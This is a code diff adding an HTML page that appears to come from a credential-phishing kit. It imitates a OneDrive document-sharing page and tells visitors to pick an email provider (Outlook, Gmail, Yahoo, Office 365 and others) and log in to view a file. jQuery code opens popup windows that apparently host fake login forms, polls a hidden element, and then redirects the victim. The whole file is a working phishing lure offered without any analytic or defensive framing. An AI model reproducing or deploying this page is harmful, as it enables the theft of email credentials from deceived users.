@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Mirrored from localhost/one/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Apr 2025 20:49:10 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Onedrive File Document Sharing</title>
+    <link rel="stylesheet" href="images/style.css">
+</head>
+
+<body>
+
+
+    <section id="log-with">
+        <div class="log-with-main-col">
+
+            <div class="log-in-col">
+
+
+
+                <div class="log-with-content top">
+                    <img src="images/logo.png" alt="">
+                    <p>To read the document, please choose your email provider below<br> Login to view shared file</p>
+                </div>
+
+                <div class="log-with-inner left">
+
+                    <ul class="login-list">
+                        <li class="login-item outlook" data-log-url="a1.html">
+                            <img src="images/ololo87.jpg" alt=""> Login with Outlook
+                        </li>
+                        <li class="login-item aol" data-log-url="a2.html">
+                            <img src="images/765rtyhgfre.jpg" alt=""> Login with AOL
+                        </li>
+
+                        <li class="login-item gmail" data-log-url="a3.html">
+                            <img src="images/kjhgfdfghj.jpg" alt=""> Login with Gmail
+                        </li>
+                    </ul>
+
+                </div>
+
+                <div class="log-with-inner right">
+
+                    <ul class="login-list">
+                        <li class="login-item office" data-log-url="a4.html">
+                            <img src="images/8765678.jpg" alt=""> Login with Office 365
+                        </li>
+                        <li class="login-item yahoo" data-log-url="a5.html">
+                            <img src="images/87654e3wdgyuikj.jpg" alt=""> Login with Yahoo
+                        </li>
+                        <li class="login-item other" data-log-url="a6.html">
+                            <img src="images/65rt67.jpg" alt=""> Login with Other mail
+                        </li>
+                    </ul>
+
+                </div>
+
+            </div>
+            <div class="log-with-content bottom">
+                <p>Get to all your files from anywhere on any device, and share them with anyone. One Drive your
+                    shared document in one cloud.</p>
+            </div>
+
+
+            
+
+
+        </div>
+    </section>
+
+ <div style="" id="checks"></div>
+   <script src="images/jquery.min.js.download"></script>
+   <script>
+     $(document).ready(function(e){ 
+	   window_opener_xc(); 
+	 });
+	 function window_opener_xc(){
+	   var url_part = get_extra_data(1);
+	   $('li.login-item').click(function(e){
+	     e.preventDefault();
+		 var checks = $('#checks');
+         checks.data('b', $(this).data('log-url'));		 
+		 var win3 = window.open($(this).data('log-url'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+	     setInterval(function(){ 
+		   if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
+		 }, 3000);
+	   });
+	 }
+	 function get_extra_data(a){
+	   var output = '';
+	   if(a==1){
+	     output = '';
+	   }
+	   else if(a==2){
+	     output = "";
+	   }
+	   return output;
+	 }
+   </script>
+
+
+</body>
+<!-- Mirrored from localhost/one/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Apr 2025 20:49:21 GMT -->
+</html>
